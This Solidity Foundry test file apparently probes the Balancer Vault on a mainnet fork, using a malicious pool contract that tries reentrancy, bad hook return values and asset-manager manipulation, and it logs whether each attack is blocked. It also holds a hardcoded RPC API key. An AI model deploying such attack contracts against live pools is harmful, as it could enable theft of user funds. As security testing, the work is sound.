// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// GROUND-SHIFT HOOK V2: More Targeted Attacks
//
// Key finding from V1: Vault blocks deregister with non-zero balance (BAL#525)
//
// New attack vectors to test:
// 1. Deregister before ANY balance (then join with wrong arrays)
// 2. Return mismatched array lengths from hook
// 3. Return amounts that exceed maxAmountsIn
// 4. Reentrancy during hook (nested joinPool/exitPool)
// 5. Asset manager manipulation during hook
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IAsset {}

interface IVault {
    enum PoolSpecialization { GENERAL, MINIMAL_SWAP_INFO, TWO_TOKEN }
    enum PoolBalanceOpKind { WITHDRAW, DEPOSIT, UPDATE }

    struct JoinPoolRequest {
        IAsset[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        IAsset[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    struct PoolBalanceOp {
        PoolBalanceOpKind kind;
        bytes32 poolId;
        IERC20 token;
        uint256 amount;
    }

    function registerPool(PoolSpecialization specialization) external returns (bytes32);
    function getPool(bytes32 poolId) external view returns (address, PoolSpecialization);
    function registerTokens(bytes32 poolId, IERC20[] memory tokens, address[] memory assetManagers) external;
    function deregisterTokens(bytes32 poolId, IERC20[] memory tokens) external;
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
    function getPoolTokenInfo(bytes32 poolId, IERC20 token) external view returns (uint256 cash, uint256 managed, uint256 lastChangeBlock, address assetManager);
    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external;
    function managePoolBalance(PoolBalanceOp[] memory ops) external;
}

interface IBasePool {
    function getPoolId() external view returns (bytes32);
}

interface IGeneralPool is IBasePool {
    function onJoinPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts);

    function onExitPool(
        bytes32 poolId,
        address sender,
        address recipient,
        uint256[] memory balances,
        uint256 lastChangeBlock,
        uint256 protocolSwapFeePercentage,
        bytes memory userData
    ) external returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts);
}

// ============================================================================
// ATTACK POOL V2: More sophisticated attacks
// ============================================================================

contract AttackPoolV2 is IGeneralPool {
    IVault public immutable vault;
    bytes32 public poolId;
    IERC20[] public tokens;

    // Attack configuration
    uint8 public attackType;
    bool public attackOnJoin;
    bool public attackOnExit;

    // Reentrancy tracking
    uint256 public reentrancyDepth;
    uint256 public maxReentrancyDepth = 2;

    // Attack results
    string public lastError;
    bool public lastAttackSuccess;

    constructor(IVault _vault) {
        vault = _vault;
    }

    function initialize(IVault.PoolSpecialization spec) external returns (bytes32) {
        poolId = vault.registerPool(spec);
        return poolId;
    }

    function getPoolId() external view override returns (bytes32) {
        return poolId;
    }

    function setupTokens(IERC20[] memory _tokens) external {
        tokens = _tokens;
        address[] memory assetManagers = new address[](_tokens.length);
        vault.registerTokens(poolId, _tokens, assetManagers);
    }

    function setupTokensWithManager(IERC20[] memory _tokens, address manager) external {
        tokens = _tokens;
        address[] memory assetManagers = new address[](_tokens.length);
        for (uint i = 0; i < _tokens.length; i++) {
            assetManagers[i] = manager;
        }
        vault.registerTokens(poolId, _tokens, assetManagers);
    }

    function setAttack(uint8 _type, bool onJoin, bool onExit) external {
        attackType = _type;
        attackOnJoin = onJoin;
        attackOnExit = onExit;
        lastError = "";
        lastAttackSuccess = false;
    }

    // ========================================================================
    // ATTACK TYPE DEFINITIONS:
    // 1 = Return wrong array length
    // 2 = Return amounts > maxAmountsIn
    // 3 = Nested joinPool (reentrancy)
    // 4 = Nested exitPool (reentrancy)
    // 5 = Asset manager UPDATE during hook
    // 6 = Return all zeros (drain without giving tokens)
    // 7 = Return massive amounts (overflow attempt)
    // ========================================================================

    function onJoinPool(
        bytes32, address sender, address recipient,
        uint256[] memory balances, uint256, uint256,
        bytes memory userData
    ) external override returns (uint256[] memory amountsIn, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");

        if (attackOnJoin) {
            _executeAttack(sender, recipient, balances, userData);
        }

        // Decode expected amounts from userData
        uint256[] memory requestedAmounts;
        if (userData.length > 0) {
            requestedAmounts = abi.decode(userData, (uint256[]));
        } else {
            requestedAmounts = new uint256[](balances.length);
        }

        // Return based on attack type
        if (attackType == 1 && attackOnJoin) {
            // Wrong array length
            amountsIn = new uint256[](balances.length + 1);
            dueProtocolFeeAmounts = new uint256[](balances.length + 1);
            return (amountsIn, dueProtocolFeeAmounts);
        } else if (attackType == 6 && attackOnJoin) {
            // Return zeros (try to join without giving tokens)
            amountsIn = new uint256[](balances.length);
            dueProtocolFeeAmounts = new uint256[](balances.length);
            return (amountsIn, dueProtocolFeeAmounts);
        } else if (attackType == 7 && attackOnJoin) {
            // Return massive amounts
            amountsIn = new uint256[](balances.length);
            dueProtocolFeeAmounts = new uint256[](balances.length);
            for (uint i = 0; i < amountsIn.length; i++) {
                amountsIn[i] = type(uint256).max;
            }
            return (amountsIn, dueProtocolFeeAmounts);
        }

        // Normal return
        amountsIn = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        for (uint i = 0; i < requestedAmounts.length && i < amountsIn.length; i++) {
            amountsIn[i] = requestedAmounts[i];
        }

        return (amountsIn, dueProtocolFeeAmounts);
    }

    function onExitPool(
        bytes32, address sender, address recipient,
        uint256[] memory balances, uint256, uint256,
        bytes memory userData
    ) external override returns (uint256[] memory amountsOut, uint256[] memory dueProtocolFeeAmounts) {
        require(msg.sender == address(vault), "Only vault");

        if (attackOnExit) {
            _executeAttack(sender, payable(recipient), balances, userData);
        }

        amountsOut = new uint256[](balances.length);
        dueProtocolFeeAmounts = new uint256[](balances.length);

        // Return small amounts for exit
        for (uint i = 0; i < balances.length; i++) {
            if (balances[i] > 0) {
                amountsOut[i] = balances[i] / 10;
            }
        }

        return (amountsOut, dueProtocolFeeAmounts);
    }

    function _executeAttack(address sender, address recipient, uint256[] memory balances, bytes memory userData) internal {
        if (attackType == 3) {
            // Reentrancy: nested joinPool
            _attemptNestedJoin(sender, recipient);
        } else if (attackType == 4) {
            // Reentrancy: nested exitPool
            _attemptNestedExit(sender, payable(recipient), balances);
        } else if (attackType == 5) {
            // Asset manager manipulation
            _attemptAssetManagerAttack();
        }
    }

    function _attemptNestedJoin(address sender, address recipient) internal {
        if (reentrancyDepth >= maxReentrancyDepth) return;
        reentrancyDepth++;

        IAsset[] memory assets = new IAsset[](tokens.length);
        uint256[] memory maxAmounts = new uint256[](tokens.length);
        for (uint i = 0; i < tokens.length; i++) {
            assets[i] = IAsset(address(tokens[i]));
            maxAmounts[i] = 1; // Tiny amount
        }

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmounts,
            userData: abi.encode(maxAmounts),
            fromInternalBalance: false
        });

        try vault.joinPool(poolId, sender, recipient, request) {
            lastAttackSuccess = true;
            lastError = "NESTED_JOIN_SUCCEEDED";
        } catch Error(string memory reason) {
            lastError = reason;
        } catch {
            lastError = "NESTED_JOIN_REVERTED";
        }

        reentrancyDepth--;
    }

    function _attemptNestedExit(address sender, address payable recipient, uint256[] memory balances) internal {
        if (reentrancyDepth >= maxReentrancyDepth) return;
        reentrancyDepth++;

        IAsset[] memory assets = new IAsset[](tokens.length);
        uint256[] memory minAmounts = new uint256[](tokens.length);
        for (uint i = 0; i < tokens.length; i++) {
            assets[i] = IAsset(address(tokens[i]));
            minAmounts[i] = 0;
        }

        IVault.ExitPoolRequest memory request = IVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmounts,
            userData: "",
            toInternalBalance: false
        });

        try vault.exitPool(poolId, sender, recipient, request) {
            lastAttackSuccess = true;
            lastError = "NESTED_EXIT_SUCCEEDED";
        } catch Error(string memory reason) {
            lastError = reason;
        } catch {
            lastError = "NESTED_EXIT_REVERTED";
        }

        reentrancyDepth--;
    }

    function _attemptAssetManagerAttack() internal {
        // Try to call managePoolBalance as asset manager during hook
        if (tokens.length == 0) return;

        IVault.PoolBalanceOp[] memory ops = new IVault.PoolBalanceOp[](1);
        ops[0] = IVault.PoolBalanceOp({
            kind: IVault.PoolBalanceOpKind.UPDATE,
            poolId: poolId,
            token: tokens[0],
            amount: 1 ether
        });

        try vault.managePoolBalance(ops) {
            lastAttackSuccess = true;
            lastError = "ASSET_MANAGER_ATTACK_SUCCEEDED";
        } catch Error(string memory reason) {
            lastError = reason;
        } catch {
            lastError = "ASSET_MANAGER_REVERTED";
        }
    }

    // Allow receiving ETH
    receive() external payable {}
}

// ============================================================================
// TEST CONTRACT V2
// ============================================================================

contract GroundShiftHookV2Test is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    AttackPoolV2 public attackPool;
    bytes32 public poolId;
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);
        WETH.deposit{value: 500 ether}();
        deal(address(BAL), attacker, 100000 ether);

        WETH.approve(address(VAULT), type(uint256).max);
        BAL.approve(address(VAULT), type(uint256).max);
    }

    function _setupPool() internal returns (bytes32) {
        attackPool = new AttackPoolV2(VAULT);
        poolId = attackPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        attackPool.setupTokens(tokens);
        return poolId;
    }

    function _setupPoolWithSelfAsManager() internal returns (bytes32) {
        attackPool = new AttackPoolV2(VAULT);
        poolId = attackPool.initialize(IVault.PoolSpecialization.GENERAL);

        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(WETH));
        tokens[1] = BAL;

        attackPool.setupTokensWithManager(tokens, address(attackPool));
        return poolId;
    }

    function _seedPool() internal {
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1 ether;
        amounts[1] = 100 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        attackPool.setAttack(0, false, false); // No attack
        VAULT.joinPool(poolId, attacker, attacker, request);
    }

    // ========================================================================
    // TEST: Wrong array length attack
    // ========================================================================

    function test_WrongArrayLength() public {
        console.log("=== ATTACK: Wrong Array Length from Hook ===");
        _setupPool();
        _seedPool();

        attackPool.setAttack(1, true, false); // Attack type 1 on join

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("!!! ATTACK SUCCEEDED - Wrong array length accepted !!!");
        } catch Error(string memory reason) {
            console.log("Attack blocked:", reason);
        } catch {
            console.log("Attack blocked (no reason) - EXPECTED");
        }
    }

    // ========================================================================
    // TEST: Reentrancy - nested joinPool
    // ========================================================================

    function test_NestedJoinReentrancy() public {
        console.log("=== ATTACK: Nested JoinPool Reentrancy ===");
        _setupPool();
        _seedPool();

        attackPool.setAttack(3, true, false); // Attack type 3 on join

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        console.log("Attempting join with nested joinPool in hook...");

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("Outer join completed");
            console.log("Attack success:", attackPool.lastAttackSuccess());
            console.log("Attack error:", attackPool.lastError());

            if (attackPool.lastAttackSuccess()) {
                console.log("!!! REENTRANCY ATTACK SUCCEEDED !!!");
            }
        } catch Error(string memory reason) {
            console.log("Join blocked:", reason);
        } catch {
            console.log("Join blocked (no reason)");
        }
    }

    // ========================================================================
    // TEST: Reentrancy - nested exitPool
    // ========================================================================

    function test_NestedExitReentrancy() public {
        console.log("=== ATTACK: Nested ExitPool Reentrancy ===");
        _setupPool();
        _seedPool();

        attackPool.setAttack(4, true, false); // Attack type 4 on join

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        console.log("Attempting join with nested exitPool in hook...");

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("Outer join completed");
            console.log("Attack success:", attackPool.lastAttackSuccess());
            console.log("Attack error:", attackPool.lastError());

            if (attackPool.lastAttackSuccess()) {
                console.log("!!! REENTRANCY ATTACK SUCCEEDED !!!");
            }
        } catch Error(string memory reason) {
            console.log("Join blocked:", reason);
        } catch {
            console.log("Join blocked (no reason)");
        }
    }

    // ========================================================================
    // TEST: Asset Manager manipulation during hook
    // ========================================================================

    function test_AssetManagerDuringHook() public {
        console.log("=== ATTACK: Asset Manager Manipulation During Hook ===");
        _setupPoolWithSelfAsManager(); // Pool is its own asset manager
        _seedPool();

        console.log("Pool is its own asset manager");

        attackPool.setAttack(5, true, false); // Attack type 5 on join

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        // Get pre-attack balances
        (IERC20[] memory tokensBefore, uint256[] memory balsBefore,) = VAULT.getPoolTokens(poolId);
        console.log("\nPre-attack pool balances:");
        for (uint i = 0; i < tokensBefore.length; i++) {
            console.log("Token", i, ":", balsBefore[i]);
            (uint256 cash, uint256 managed,,) = VAULT.getPoolTokenInfo(poolId, tokensBefore[i]);
            console.log("  Cash:", cash);
            console.log("  Managed:", managed);
        }

        console.log("\nExecuting join with asset manager attack...");

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("\nJoin completed!");
            console.log("Attack success:", attackPool.lastAttackSuccess());
            console.log("Attack result:", attackPool.lastError());

            // Get post-attack balances
            (IERC20[] memory tokensAfter, uint256[] memory balsAfter,) = VAULT.getPoolTokens(poolId);
            console.log("\nPost-attack pool balances:");
            for (uint i = 0; i < tokensAfter.length; i++) {
                console.log("Token", i, ":", balsAfter[i]);
                (uint256 cash, uint256 managed,,) = VAULT.getPoolTokenInfo(poolId, tokensAfter[i]);
                console.log("  Cash:", cash);
                console.log("  Managed:", managed);

                // Check for accounting corruption
                if (balsAfter[i] != cash + managed) {
                    console.log("  !!! INVARIANT VIOLATION !!!");
                }
            }

            if (attackPool.lastAttackSuccess()) {
                console.log("\n!!! ASSET MANAGER ATTACK SUCCEEDED DURING HOOK !!!");
            }

        } catch Error(string memory reason) {
            console.log("Join blocked:", reason);
        } catch {
            console.log("Join blocked (no reason)");
        }
    }

    // ========================================================================
    // TEST: Zero amounts attack (join without giving tokens)
    // ========================================================================

    function test_ZeroAmountsJoin() public {
        console.log("=== ATTACK: Zero Amounts Join (Get pool tokens for free) ===");
        _setupPool();
        _seedPool();

        attackPool.setAttack(6, true, false); // Attack type 6 - return zeros

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        uint256 wethBefore = WETH.balanceOf(attacker);
        uint256 balBefore = BAL.balanceOf(attacker);

        console.log("Attempting join where hook returns zero amounts...");

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            uint256 wethAfter = WETH.balanceOf(attacker);
            uint256 balAfter = BAL.balanceOf(attacker);

            console.log("Join completed!");
            console.log("WETH change:", wethBefore - wethAfter);
            console.log("BAL change:", balBefore - balAfter);

            if (wethAfter == wethBefore && balAfter == balBefore) {
                console.log("!!! NO TOKENS TRANSFERRED - ATTACK SUCCEEDED !!!");
            }

        } catch Error(string memory reason) {
            console.log("Attack blocked:", reason);
        } catch {
            console.log("Attack blocked (no reason)");
        }
    }

    // ========================================================================
    // TEST: Overflow amounts attack
    // ========================================================================

    function test_OverflowAmountsJoin() public {
        console.log("=== ATTACK: Overflow Amounts (return type(uint256).max) ===");
        _setupPool();
        _seedPool();

        attackPool.setAttack(7, true, false); // Attack type 7 - return massive amounts

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.1 ether;
        amounts[1] = 10 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        console.log("Attempting join where hook returns uint256.max amounts...");

        try VAULT.joinPool(poolId, attacker, attacker, request) {
            console.log("!!! JOIN SUCCEEDED WITH OVERFLOW AMOUNTS !!!");
        } catch Error(string memory reason) {
            console.log("Attack blocked:", reason);
        } catch {
            console.log("Attack blocked (no reason) - overflow likely caught");
        }
    }

    // ========================================================================
    // TEST: Check reentrancy guard behavior
    // ========================================================================

    function test_ReentrancyGuardCheck() public {
        console.log("=== TEST: Reentrancy Guard Behavior ===");
        _setupPool();
        _seedPool();

        // Try to directly call joinPool during a hook simulation
        // This tests if the reentrancy guard is properly set

        console.log("Pool created and seeded");
        console.log("Testing reentrancy protection...");

        // The attack pool will try to call joinPool from within onJoinPool
        attackPool.setAttack(3, true, false);

        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(WETH));
        assets[1] = IAsset(address(BAL));

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0.01 ether;
        amounts[1] = 1 ether;

        IVault.JoinPoolRequest memory request = IVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: amounts,
            userData: abi.encode(amounts),
            fromInternalBalance: false
        });

        VAULT.joinPool(poolId, attacker, attacker, request);

        string memory error = attackPool.lastError();
        console.log("Nested call result:", error);

        if (keccak256(bytes(error)) == keccak256(bytes("BAL#400"))) {
            console.log("Reentrancy guard working (BAL#400 = REENTRANCY)");
        } else if (attackPool.lastAttackSuccess()) {
            console.log("!!! REENTRANCY GUARD BYPASSED !!!");
        } else {
            console.log("Blocked for other reason");
        }
    }

    receive() external payable {}
}
